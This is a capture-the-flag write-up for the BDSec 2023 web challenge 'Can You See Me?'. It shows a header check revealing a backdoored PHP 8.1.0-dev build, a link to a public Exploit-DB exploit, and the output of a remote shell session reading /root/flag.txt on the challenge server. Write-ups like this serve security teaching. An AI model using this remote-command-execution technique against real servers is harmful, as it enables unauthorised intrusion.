---
title: BDSec 2023 - Can You See Me?
date: Fri Jul 21 06:52:38 PM +04 2023
categories: [Writeup]
tags: [ctf,bdsec,bdsec2023,web]
---

## Description

Test Your eyes. By the way PHP is the best programming language :3

> [http://139.144.184.115:8989/](http://139.144.184.115:8989/)

Alternative Link:

> [http://170.187.204.136:8989/](http://170.187.204.136:8989/)

> Bruteforce / Fuzzings are not allowed.
{: .prompt-danger }

Flag Format: BDSEC{flag}

**Author: Saif**

## Solution

The webpage is a placeholder, there's absolutely nothing there. 

URL gives interesting headers:

```bash
➜ curl -I http://139.144.184.115:8989/
HTTP/1.1 200 OK
Host: 139.144.184.115:8989
Date: Fri, 21 Jul 2023 14:48:54 GMT
Connection: close
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8
```

Ready to be used exploit right out of the box <https://www.exploit-db.com/exploits/49933>

```bash
└─$ python3 exploit.py        
Enter the full host url:
http://139.144.184.115:8989/

Interactive shell is opened on http://139.144.184.115:8989/ 
Cant acces tty; job crontol turned off.
$ ls          
index.php

$ ls /home

$ ls /root
flag.txt

$ cat /root/flag.txt
BDSEC{php_15_7h3_b357_pr06r4mm1n6_l4n6u463}
```

> Flag: BDSEC{php_15_7h3_b357_pr06r4mm1n6_l4n6u463}
{: .prompt-tip }